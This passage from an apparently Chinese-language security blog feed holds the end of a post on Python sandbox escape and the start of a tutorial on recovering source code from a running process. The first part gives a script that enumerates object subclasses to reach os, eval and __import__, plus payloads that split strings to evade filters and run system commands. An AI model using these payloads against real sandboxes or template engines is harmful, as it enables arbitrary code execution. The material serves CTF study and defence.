class="string">'queue'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'re'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</div><div class="line">                <span class="string">'reprlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'runpy'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'secrets'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'selectors'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'signal'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'smtplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'socketserver'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre_compile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</div><div class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statistics'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tokenize'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tracemalloc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'tty'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'typing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'weakref'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</div><div class="line">                <span class="string">'zipapp'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>]&#125;</div><div class="line"></div><div class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</div><div class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</div><div class="line"></div><div class="line">all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))</div><div class="line">all_modules = list(set(list(find_modules.keys()) + target_modules))</div><div class="line"></div><div class="line">subclasses = ().<span class="symbol">__class__</span>.<span class="symbol">__bases__</span>[<span class="number">0</span>].<span class="symbol">__subclasses__</span>()</div><div class="line">sub_name = [s.<span class="symbol">__name__</span> for s in subclasses]</div><div class="line"></div><div class="line"># 第一种遍历,如:().<span class="symbol">__class__</span>.<span class="symbol">__bases__</span>[<span class="number">0</span>].<span class="symbol">__subclasses__</span>()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</div><div class="line">print(<span class="string">'----------1-----------'</span>)</div><div class="line">for i, s in enumerate(sub_name):</div><div class="line">    for f in all_targets:</div><div class="line">        if f == s:</div><div class="line">            if f in target_functions:</div><div class="line">                print(i, f)</div><div class="line">            elif f in all_modules:</div><div class="line">                target = find_modules[f]</div><div class="line">                sub_dict = subclasses[i].<span class="symbol">__dict__</span></div><div class="line">                for t in target:</div><div class="line">                    if t in sub_dict:</div><div class="line">                        print(i, f, target)</div><div class="line"></div><div class="line">print(<span class="string">'----------2-----------'</span>)</div><div class="line"># 第二种遍历,如:().<span class="symbol">__class__</span>.<span class="symbol">__bases__</span>[<span class="number">0</span>].<span class="symbol">__subclasses__</span>()[<span class="number">59</span>].<span class="symbol">__init__</span>.<span class="symbol">__globals__</span>[<span class="string">'linecache'</span>].<span class="symbol">__dict__</span>[<span class="string">'o'</span>+<span class="string">'s'</span>].<span class="symbol">__dict__</span>[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>)</div><div class="line">for i, sub in enumerate(subclasses):</div><div class="line">    try:</div><div class="line">        more = sub.<span class="symbol">__init__</span>.<span class="symbol">__globals__</span></div><div class="line">        for m in all_targets:</div><div class="line">            if m in more:</div><div class="line">                print(i, sub, m, find_modules.get(m))</div><div class="line">    except <span class="symbol">Exception</span> as e:</div><div class="line">        pass</div><div class="line"></div><div class="line">print(<span class="string">'----------3-----------'</span>)</div><div class="line"># 第三种遍历,如:().<span class="symbol">__class__</span>.<span class="symbol">__bases__</span>[<span class="number">0</span>].<span class="symbol">__subclasses__</span>()[<span class="number">59</span>].<span class="symbol">__init__</span>.<span class="symbol">__globals__</span>.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</div><div class="line">for i, sub in enumerate(subclasses):</div><div class="line">    try:</div><div class="line">        more = sub.<span class="symbol">__init__</span>.<span class="symbol">__globals__</span>.values()</div><div class="line">        for j, v in enumerate(more):</div><div class="line">            for f in all_targets:</div><div class="line">                try:</div><div class="line">                    if f in v:</div><div class="line">                        if f in target_functions:</div><div class="line">                            print(i, j, sub, f)</div><div class="line">                        elif f in all_modules:</div><div class="line">                            target = find_modules.get(f)</div><div class="line">                            sub_dict = v[f].<span class="symbol">__dict__</span></div><div class="line">                            for t in target:</div><div class="line">                                if t in sub_dict:</div><div class="line">                                    print(i, j, sub, f, target)</div><div class="line">                except <span class="symbol">Exception</span> as e:</div><div class="line">                    pass</div><div class="line">    except <span class="symbol">Exception</span> as e:</div><div class="line">        pass</div><div class="line"></div><div class="line">print(<span class="string">'----------4-----------'</span>)</div><div class="line"># 第四种遍历:如:().<span class="symbol">__class__</span>.<span class="symbol">__bases__</span>[<span class="number">0</span>].<span class="symbol">__subclasses__</span>()[<span class="number">59</span>]().<span class="symbol">_module</span>.<span class="symbol">__builtins__</span>[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</div><div class="line"># &lt;class <span class="string">'warnings.catch_warnings'</span>&gt;类很特殊，在内部定义了<span class="symbol">_module</span>=sys.modules[<span class="string">'warnings'</span>]，然后warnings模块包含有<span class="symbol">__builtins__</span>，不具有通用性，本质上跟第一种方法类似</div><div class="line">for i, sub in enumerate(subclasses):</div><div class="line">    try:</div><div class="line">        more = sub().<span class="symbol">_module</span>.<span class="symbol">__builtins__</span></div><div class="line">        for f in all_targets:</div><div class="line">            if f in more:</div><div class="line">                print(i, f)</div><div class="line">    except <span class="symbol">Exception</span> as e:</div><div class="line">        pass</div></pre></td></tr></table></figure></li><li><p>在Python 3.6.4，Ubuntu 16.04的环境上运行结果如下：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">----------<span class="number">1</span>-----------</div><div class="line">----------<span class="number">2</span>-----------</div><div class="line"><span class="number">64</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span> None</div><div class="line"><span class="number">64</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">64</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; sys None</div><div class="line"><span class="number">65</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span> None</div><div class="line"><span class="number">65</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">65</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; sys None</div><div class="line"><span class="number">66</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span> None</div><div class="line"><span class="number">66</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">66</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; sys None</div><div class="line"><span class="number">67</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span> None</div><div class="line"><span class="number">67</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">67</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; sys None</div><div class="line"><span class="number">68</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span> None</div><div class="line"><span class="number">68</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">68</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt; sys None</div><div class="line"><span class="number">79</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.FileLoader'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">79</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.FileLoader'</span>&gt; sys None</div><div class="line"><span class="number">80</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._NamespacePath'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">80</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._NamespacePath'</span>&gt; sys None</div><div class="line"><span class="number">81</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._NamespaceLoader'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">81</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external._NamespaceLoader'</span>&gt; sys None</div><div class="line"><span class="number">83</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.FileFinder'</span>&gt; <span class="number">__</span>builtins<span class="number">__</span> None</div><div class="line"><span class="number">83</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib_external.FileFinder'</span>&gt; sys None</div><div class="line"><span class="number">91</span> &lt;<span class="keyword">class</span> <span class="string">'codecs.IncrementalEncoder'</span>&gt; open None</div><div class="line">...</div><div class="line">----------<span class="number">3</span>-----------</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; compile</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; open</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; eval</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; exec</div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; compile</div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; open</div><div class="line">----------<span class="number">4</span>-----------</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; compile</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; open</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; eval</div><div class="line"><span class="number">64</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLock'</span>&gt; exec</div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; compile</div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; open</div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; eval</div><div class="line"><span class="number">65</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._DummyModuleLock'</span>&gt; exec</div><div class="line"><span class="number">66</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; compile</div><div class="line"><span class="number">66</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">66</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; open</div><div class="line"><span class="number">66</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; eval</div><div class="line"><span class="number">66</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._ModuleLockManager'</span>&gt; exec</div><div class="line"><span class="number">67</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; compile</div><div class="line"><span class="number">67</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">67</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; open</div><div class="line"><span class="number">67</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; eval</div><div class="line"><span class="number">67</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib._installed_safely'</span>&gt; exec</div><div class="line"><span class="number">68</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt; compile</div><div class="line"><span class="number">68</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt; <span class="number">__</span><span class="keyword">import</span><span class="number">__</span></div><div class="line"><span class="number">68</span> <span class="number">5</span> &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.ModuleSpec'</span>&gt; open</div><div class="line">...</div></pre></td></tr></table></figure></li><li><p>Python3可绕过的方法太多，这里没有全部列出来，有兴趣的自己执行查看结果。根据不同的方式，填入不同的索引和模块就可以绕过沙箱。</p></li></ul><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul><li><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="external"> python沙箱逃逸小结</a></li><li><a href="http://bestwing.me/2017/02/27/Python%20-%20sandbox%20-%20escape/" target="_blank" rel="external">从一个CTF题目学习Python沙箱逃逸</a></li><li><a href="http://cb.drops.wiki/drops/web-13057.html" target="_blank" rel="external">利用 Python 特性在 Jinja2 模板中执行任意代码</a></li><li><a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="external">探索Flask/Jinja2中的服务端模版注入（二）</a></li></ul></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>如何恢复丢失的Python源代码如果它还在内存中运行</title>
      <link href="/2018/02/27/%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E4%B8%A2%E5%A4%B1%E7%9A%84Python%E6%BA%90%E4%BB%A3%E7%A0%81%E5%A6%82%E6%9E%9C%E5%AE%83%E8%BF%98%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BF%90%E8%A1%8C/"/>
      <url>/2018/02/27/%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E4%B8%A2%E5%A4%B1%E7%9A%84Python%E6%BA%90%E4%BB%A3%E7%A0%81%E5%A6%82%E6%9E%9C%E5%AE%83%E8%BF%98%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BF%90%E8%A1%8C/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>如何恢复丢失的Python源代码如果它还在内存中运行</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>使用 <a href="https://pypi.python.org/pypi/pyrasite/和https://pypi.python.org/pypi/uncompyle6" target="_blank" rel="external">https://pypi.python.org/pypi/pyrasite/和https://pypi.python.org/pypi/uncompyle6</a> 恢复还在内存中运行，但是已经丢失的源代码。</p><h3 id="需要恢复的Python源代码"><a href="#需要恢复的Python源代码" class="headerlink" title="需要恢复的Python源代码"></a>需要恢复的Python源代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">import json</div><div class="line">import time</div><div class="line"></div><div class="line">def test():</div><div class="line">    &quot;&quot;&quot;this is a function&quot;&quot;&quot;</div><div class="line">    print(&apos;test&apos;)</div><div class="line">    while True:</div><div class="line">        print(&apos;123&apos;)</div><div class="line">        time.sleep(3)</div><div class="line"></div><div class="line"># test file</div><div class="line"></div><div class="line">class Test():</div><div class="line">    &quot;&quot;&quot;this is a class&quot;&quot;&quot;</div><div class="line">    def __init__():</div><div class="line">        print(&apos;object&apos;)</div><div class="line">    </div><div class="line">    def foo(self):</div><div class="line">        &quot;&quot;&quot;this is a method&quot;&quot;&quot;</div><div class="line">        for i in range(10):</div><div class="line">            print(&apos;foo&apos;)</div><div class="line"></div><div class="line">test()</div></pre></td></tr></table></figure><h3 id="安装GDB（pyrasite需要）"><a href="#安装GDB（pyrasite需要）" class="headerlink" title="安装GDB（pyrasite需要）"></a>安装GDB（pyrasite需要）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get update &amp;&amp; apt-get install gdb</span></div></pre></td></tr></table></figure><h3 id="安装pyrasite，它允许你连接一个Python-shell到还在运行的进程上"><a href="#安装pyrasite，它允许你连接一个Python-shell到还在运行的进程上" class="headerlink" title="安装pyrasite，它允许你连接一个Python shell到还在运行的进程上"></a>安装pyrasite，它允许你连接一个Python shell到还在运行的进程上</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install pyrasite</span></div></pre></td></tr></table></figure><h3 id="安装uncompyle6，它允许你从内存代码对象中获取Python源代码"><a href="#安装uncompyle6，它允许你从内存代码对象中获取Python源代码" class="headerlink" title="安装uncompyle6，它允许你从内存代码对象中获取Python源代码"></a>安装uncompyle6，它允许你从内存代码对象中获取Python源代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install uncompyle6</span></div></pre></td></tr></table></figure><h3 id="找到还在运行进程的PID"><a href="#找到还在运行进程的PID" class="headerlink" title="找到还在运行进程的PID"></a>找到还在运行进程的PID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ps aux | grep python</span></div></pre></td></tr></table></figure><h3 id="使用pyrasite连接到PID生成一个交互式shell"><a href="#使用pyrasite连接到PID生成一个交互式shell" class="headerlink" title="使用pyrasite连接到PID生成一个交互式shell"></a>使用pyrasite连接到PID生成一个交互式shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pyrasite-shell &lt;PID&gt;</span></div></pre></td></tr></table></figure><p>注意：这一步操作并不是总是能成功，笔者在Ubuntu 16.04系统上连接失败，在Centos7.4系统上连接成功</p><h3 id="找出你要恢复的函数和类"><a href="#找出你要恢复的函数和类" class="headerlink" title="找出你要恢复的函数和类"></a>找出你要恢复的函数和类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;dir()</div></pre></td></tr></table></figure><p>如下图，我需要恢复的一个对象Test和一个函数test<br><img src="/2018/02/27/如何恢复丢失的Python源代码如果它还在内存中运行/1.png" alt="运行效果"></p><h3 id="将函数和对象反编译为源代码"><a href="#将函数和对象反编译为源代码" class="headerlink" title="将函数和对象反编译为源代码"></a>将函数和对象反编译为源代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># pyrasite-shell 11062</span></div><div class="line">Pyrasite Shell <span class="number">2.0</span></div><div class="line">Connected to <span class="string">'python test.py'</span></div><div class="line">Python <span class="number">3.6</span><span class="number">.3</span> (default, Nov  <span class="number">1</span> <span class="number">2017</span>, <span class="number">18</span>:<span class="number">31</span>:<span class="number">17</span>) </div><div class="line">[GCC <span class="number">4.8</span><span class="number">.5</span> <span class="number">20150623</span> (Red Hat <span class="number">4.8</span><span class="number">.5</span><span class="number">-16</span>)] on linux</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">(DistantInteractiveConsole)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> uncompyle6</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</div><div class="line">[<span class="string">'DistantInteractiveConsole'</span>, <span class="string">'InteractiveConsole'</span>, <span class="string">'ReverseConnection'</span>, 